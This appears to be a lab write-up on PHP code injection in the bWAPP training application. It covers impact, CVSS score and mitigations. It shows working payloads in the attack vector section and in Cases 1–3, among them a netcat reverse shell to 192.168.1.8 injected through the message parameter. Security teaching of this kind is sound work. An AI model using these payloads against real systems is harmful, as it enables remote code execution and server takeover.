# PHP Code Injection – Remote Code Execution (RCE)

## 1. Description
PHP Code Injection is a critical vulnerability where user-supplied input is interpreted as PHP code by the server.  
This allows attackers to execute arbitrary PHP functions, access sensitive system data, and even gain remote shell access.  

In this bWAPP module, the `message` GET parameter is passed directly into PHP's execution context without sanitization, enabling direct code execution.

---

## 2. CVSS Score & Severity
- **Severity:** Critical  
- **CVSS v3.1 Base Score:** 9.8  

---

## 3. Impact
- **Full System Compromise** – Execute arbitrary system commands.  
- **Sensitive Data Disclosure** – Access configuration files, credentials, and environment variables.  
- **Web Shell Deployment** – Maintain persistent access to the server.  
- **Privilege Escalation** – Potential to escalate privileges depending on misconfigurations.  
- **Service Disruption** – Delete/modify files, crash services.  

---

## 4. Attack Vector
The vulnerable parameter:  
- **GET method:** `message` in `/phpi.php`

**Example vulnerable request (executing `phpinfo()`):**
```
http://localhost/bWAPP/phpi.php?message=phpinfo()
```

**Example command execution via `system()` for RCE:**
```
http://localhost/bWAPP/phpi.php?message=system('ls')
```

**Reverse shell payload example:**
```
http://localhost/bWAPP/phpi.php?message=system('nc 192.168.1.8 4444 -e /bin/bash')
```

---

## 5. Vulnerability Scan
Confirmed using:  
- **Manual Testing** – Injected PHP function calls (`phpinfo()`, `system('ls')`) and confirmed output in browser.  
- **Reverse Shell** – Established connection to attacker machine using Netcat.  

---

## 6. How the Attack is Performed

### Case 1 – Information Disclosure
1. Navigate to `PHP Code Injection` in bWAPP.  
2. Set security level to **low**.  
3. Inject payload in `message` parameter:
```
phpinfo()
```
<img width="752" height="466" alt="image" src="https://github.com/user-attachments/assets/3be5227a-5924-4a94-81b5-0d6d75b8268f" />

4. Server executes PHP code and displays detailed environment info (PHP version, server paths, etc.).  
<img width="752" height="426" alt="image" src="https://github.com/user-attachments/assets/7405fc22-18b8-4af1-9216-7e71c0aa1352" />

---

### Case 2 – Directory Listing via system()
1. Inject payload:
```
system('ls')
```
2. Server executes system command and lists web application files.
<img width="752" height="355" alt="image" src="https://github.com/user-attachments/assets/bae3da8c-3280-4a2e-bcf8-66f49ea5e7a8" />

### Case 3 – Remote Shell Access (RCE)
1. Start Netcat listener:
```
nc -lvp 4444
```
2. Inject payload:
```
system('nc 192.168.1.8 4444 -e /bin/bash')
```
<img width="752" height="295" alt="image" src="https://github.com/user-attachments/assets/3e2c9306-a95f-459a-9259-84d1119bf01c" />

3. Gain interactive shell as `www-data` user.
<img width="752" height="393" alt="image" src="https://github.com/user-attachments/assets/e070f8d0-9552-436c-9b32-1eb255868c0c" />

---

## 7. Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **Disable Dangerous PHP Functions** | Disable `eval`, `system`, `exec`, `passthru`, `shell_exec` in `php.ini`. |
| **Input Validation** | Reject any input containing PHP code execution characters. |
| **Output Encoding** | Encode user data before rendering in the browser. |
| **Least Privilege Principle** | Run the web server as a restricted user (not root). |
| **Web Application Firewall (WAF)** | Detect and block suspicious payloads in HTTP requests. |
| **Security Testing** | Regularly test for code injection flaws with tools like Burp Suite or OWASP ZAP. |

---
